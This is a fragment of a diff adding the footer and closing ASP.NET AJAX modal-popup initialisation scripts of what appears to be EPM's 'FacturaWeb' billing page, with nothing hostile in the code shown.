+                            src="https://www13.epm.com.co/FacturaWeb/App_Themes/Default/img/footer/logo-epm.png" />
+                    </div>
+                </div>
+            </div>
+        </footer>
+
+
+        <script type="text/javascript">
+            //<![CDATA[
+            (function () { var fn = function () { Sys.Extended.UI.ModalPopupBehavior.invokeViaServer('ctl00_cphPrincipal_mdlPagosSoloEPM', true); Sys.Application.remove_load(fn); }; Sys.Application.add_load(fn); })(); Sys.Application.add_init(function () {
+                $create(Sys.Extended.UI.ModalPopupBehavior, { "BackgroundCssClass": "simple-modal-background", "CancelControlID": "btnContinuar", "PopupControlID": "ctl00_cphPrincipal_pPagosSoloEPMn", "dynamicServicePath": "/FacturaWeb/Paginas/Inicio.aspx", "id": "ctl00_cphPrincipal_mdlPagosSoloEPM" }, null, null, $get("ctl00_cphPrincipal_hddInfoSoloPagosEPM"));
+            });
+            Sys.Application.add_init(function () {
+                $create(Sys.Extended.UI.ModalPopupBehavior, { "BackgroundCssClass": "simple-modal-background", "CancelControlID": "btnCerrar", "PopupControlID": "ctl00_panVentanaModalAdvertencia", "dynamicServicePath": "/FacturaWeb/Paginas/Inicio.aspx", "id": "ctl00_mdlMensajes" }, null, null, $get("ctl00_hddMensajes"));
+            });
+//]]>
+        </script>
+    </form>
+</body>
+
+</html>
